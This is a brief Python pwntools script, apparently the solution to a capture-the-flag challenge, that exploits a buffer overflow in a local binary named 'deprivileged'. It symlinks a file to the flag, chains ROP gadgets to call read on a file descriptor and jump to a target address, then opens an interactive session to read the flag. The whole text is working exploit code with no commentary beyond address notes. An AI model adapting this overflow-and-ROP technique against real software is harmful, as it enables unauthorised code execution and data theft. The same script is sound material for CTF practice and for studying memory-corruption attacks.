from pwn import *

GARB = 'bbbbbbbb'

# This code requires a symbolic link from 'good luck' to flag to work
if os.path.exists("good luck"):
    os.remove("good luck")
os.symlink("flag", "good luck")

# Addresses needed for the attack
pop_rdi_ret_addr = 0x400a63 # From ROPgadget --binary ./deprivileged
pop_rsi_pop_r15_ret_addr = 0x400a61 # From ROPgadget --binary ./deprivileged
inside_target_addr = 0x400946 # From gdb ./deprivileged
read_addr = ELF('./deprivileged').symbols['read']

# Readable and writable
ans_addr = 0x000000601040

# Launch processs and send rop chain
p = process('./deprivileged')
inp = 'a' * 0x20 + GARB + p64(pop_rdi_ret_addr) + p64(3) + p64(pop_rsi_pop_r15_ret_addr) + p64(ans_addr) + GARB + p64(read_addr) + p64(inside_target_addr)
p.sendline(inp)

# See the flag
p.interactive()

